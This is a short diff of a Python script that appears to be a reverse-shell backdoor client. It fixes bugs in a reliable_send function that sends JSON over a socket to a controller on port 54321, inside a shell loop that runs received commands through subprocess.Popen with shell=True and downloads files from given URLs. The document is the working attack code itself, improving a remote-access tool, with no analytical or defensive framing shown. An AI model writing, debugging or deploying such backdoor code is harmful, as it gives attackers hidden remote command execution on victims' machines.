@@ -15,7 +15,9 @@ PORT = 54321
 
 
 def reliable_send(_s, _data):
-    json_data = json.dumps(_data.decode('UTF-8'))
+    if type(_data) is bytes:
+        _data = _data.decode('UTF-8')
+    json_data = json.dumps(_data)
     _s.sendall(json_data.encode('UTF-8'))
 
 
@@ -77,9 +79,9 @@ def shell(_s):
         elif cmd[:8] == 'download' and len(cmd[9:]) > 1:
             try:
                 download(cmd[9:])
-                reliable_send('[+] Downloaded File from the specified URL!')
+                reliable_send(_s, '[+] Downloaded File from the specified URL!')
             except:
-                reliable_send('[!] Failed to Download the File from the specified URL!')
+                reliable_send(_s, '[!] Failed to Download the File from the specified URL!')
         else:
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
